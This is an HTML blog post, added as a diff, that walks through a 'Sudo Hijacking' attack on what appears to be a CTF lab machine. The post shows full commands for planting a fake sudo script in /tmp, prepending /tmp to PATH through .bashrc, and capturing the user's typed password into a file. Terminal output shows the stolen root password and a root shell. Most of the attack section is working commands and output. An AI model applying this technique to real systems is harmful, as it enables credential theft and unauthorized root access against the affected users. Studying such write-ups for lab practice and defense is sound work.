@@ -1,0 +1,212 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-8083932952140695"
+     crossorigin="anonymous"></script>
+    <title>Sudo Hijacking</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.105.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="Karanbir Singh" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://thelinuxboy007.github.io/main.css" />
+
+    
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-SLVHGT13XR"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-SLVHGT13XR', { 'anonymize_ip': false });
+}
+</script>
+
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Sudo Hijacking"/>
+<meta name="twitter:description" content="Sudo Hijacking"/>
+
+    <meta property="og:title" content="Sudo Hijacking" />
+<meta property="og:description" content="Sudo Hijacking" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-01-23T14:47:58+13:00" />
+<meta property="article:modified_time" content="2023-01-23T14:47:58+13:00" />
+
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://thelinuxboy007.github.io/"><img class="app-header-avatar" src="https://tryhackme-images.s3.amazonaws.com/user-avatars/b959e5db0ac57201bb48c75c39ded6ce.jpg" alt="Karanbir Singh" /></a>
+      <span class="app-header-title">Karanbir Singh</span>
+      <nav class="app-header-menu">
+
+          <a class="app-header-menu-item" href="https://tryhackme.com/RamghariaSaab/badges/hacker-of-the-month">Monthly Hacker Award</a>
+             - 
+          
+          <a class="app-header-menu-item" href="https://tryhackme.com/p/RamghariaSaab">TryHackme</a>
+             - 
+          
+          <a class="app-header-menu-item" href="https://app.hackthebox.com/profile/780921">HackTheBox</a>
+             - 
+          
+          <a class="app-header-menu-item" href="https://instagram.com/karan._ramgharia_">Instagram</a>
+          -
+        <a class="app-header-menu-item" href="https://github.com/karanbir-singh001">GitHub</a>
+         - 
+        <a class="app-header-menu-item" href="https://www.cloudskillsboost.google/public_profiles/df407ae3-d3dc-4de6-84c5-5b34169033da">Google</a>
+         - 
+        <a class="app-header-menu-item" href="https://learn.microsoft.com/en-us/users/karanramgharia-8633">Microsoft</a>
+      </nav>
+
+      <p>Hii, I am Karanbir Singh. I like programming, CTFs, HACKING. I am interested in Purple Teaming i.e. RED TEAMING and BLUE TEAMING both.</p>
+	    <a style="font-size: larger;" href="https://thelinuxboy007.github.io/"><strong>HOME</strong></a>
+      <ul>
+      <a style="font-size: larger;" href="backdoor/index.html"><strong>Admin Backdoor</strong></a>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <script src="/js/crypto-js.min.js"></script>
+      <script src="/js/dice.js"></script>
+      <h1 class ="post-title">Sudo Hijacking</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Feb 5, 2023
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          15 min read
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h1 id="intro">What is Sudo Hijacking</h1>
+<p>Sudo Hijacking is where you move the Sudo binary file, and replace it with a script which mimic's Sudo, capturing the user's plain text password for the attacker while relaying the password to the legitimate Sudo binary file for user access.</p>
+
+  <h1 id="TESTING">Practical Example</h1>
+<h1 id="TEST">1. TESTING</h1>
+<p><strong>Logging in</strong></p>
+<pre tabindex="0">
+<p><code>[root@thelinuxboy]─[/home/karan]# ssh -i id_rsa user@$IP
+The authenticity of host '10.10.143.254 (10.10.143.254)' can't be established.
+ECDSA key fingerprint is SHA256:QW+kRJ2hSFFoUOH0vqtRRGx825GDnuqH0pnamx/0WOc.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.10.10' (ECDSA) to the list of known hosts.
+Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-96-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
+
+To restore this content, you can run the 'unminimize' command.
+Last login: Sun Feb  5 06:01:39 2023 from 10.10.10.10
+user@$IP:~$ id
+uid=1000(user) gid=1000(user) groups=1000(user),27(sudo)</code></pre>
+<p> So, firstly we logged in to the target machine with id_rsa.
+<p><strong>Checking running processes with pspy64 (PROOF OF CONCEPT)</strong></p>
+<pre tabindex="0">
+<p><code>2023/02/05 06:24:17 CMD: UID=1000  PID=2864   | sshd: user@pts/1    
+2023/02/05 06:24:18 CMD: UID=1000  PID=2865   | sshd: user@pts/1    
+2023/02/05 06:24:18 CMD: UID=0     PID=2866   | sudo cat /etc/shadow 
+2023/02/05 06:24:38 CMD: UID=0     PID=2867   | sshd: [accepted]  
+2023/02/05 06:24:38 CMD: UID=0     PID=2868   | sshd: [accepted]     
+2023/02/05 06:24:38 CMD: UID=0     PID=2869   | sshd: user [priv]</p></code></pre>
+<p>So we can see that user with pts/1 has logged in and <code> sudo cat /etc/shadow </code> is running with uid 0 which means it's running as root.
+<p><strong>Exploit Testing</strong></p>
+<p>Create a exploit with name <code> sudo </code> in the /tmp directory, with following code.
+<pre tabindex="0">
+<p><code>user@$IP:~$ cat /tmp/sudo
+#!/bin/bash
+
+echo test > /tmp/test
+user@$IP:~$chmod +x sudo
+user@$IP:~$</code></pre>
+<p><strong>Changing Path For Exploitation</strong></p>
+<p>In <code>/home/user/.bashrc</code> write the path at top anywhere as given below:-
+<pre tabindex="0">
+<p><code># ~/.bashrc: executed by bash(1) for non-login shells.
+# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
+# for examples
+<strong>PATH=/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin</strong>
+# If not running interactively, don't do anything
+case $- in
+    *i*) ;;
+      *) return;;
+esac
+</code><p></pre>
+<p>Now login with another tab</p>
+<pre tabindex="0">
+<p><code>user@$IP:~$ echo $PATH
+/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+user@$IP:~$
+</p></code></pre> 
+<p>So, we can see that the <code>PATH</code> has been changed of user.
+<p><strong>TEST SUCCESSFUL :)</strong></p>
+<pre tabindex="0">
+<p><code>user@$IP:~$ ls /tmp
+sudo  test
+user@$IP:~$ </p></code></pre>
+<h1 id="FINAL">2. FINAL EXPLOIT</h1>
+<p>Change the exploit <code>sudo</code> with following code:
+<pre tabindex="0">
+<p><code>user@$IP:~$ cat /tmp/sudo
+#!/bin/bash
+read -p 'Enter password for root:' passwd
+
+echo $passwd > /tmp/passwd<p></code></pre>
+<p><strong>Open a new TAB and login once again</strong></p>
+<p>GREETINGS, It worked and we got password of root ;)</p>
+<pre tabindex="0">
+<p><code>user@$IP:~$ ls /tmp
+passwd  sudo  test
+user@$IP:~$ cat /tmp/passwd
+Password@#1212674
+user@@IP:~$</code></p></pre>
+<p>So, The password that we got is Password@#1212674 </p>
+<p><strong>GETTING ROOT</strong></p>
+<p>Change the <code>/home/user/.bashrc</code> as it was before.
+<pre tabindex="0">
+<p><code># ~/.bashrc: executed by bash(1) for non-login shells.
+# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
+# for examples
+
+# If not running interactively, don't do anything
+case $- in
+    *i*) ;;
+      *) return;;
+esac<p></code></pre>
+<p><strong> ROOT </strong></p>
+<pre tabindex="0">
+<p><code>user@$IP:~$ echo $PATH
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+user@$IP:~$ sudo su
+[sudo] password for user: 
+root@user123:/home/user# whoami
+root
+root@user123:/home/user#</p></code></pre>
+<p>So, Finally we are root now.</p>
+<h1 id="TEST">THANK YOU.</h1>
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
+
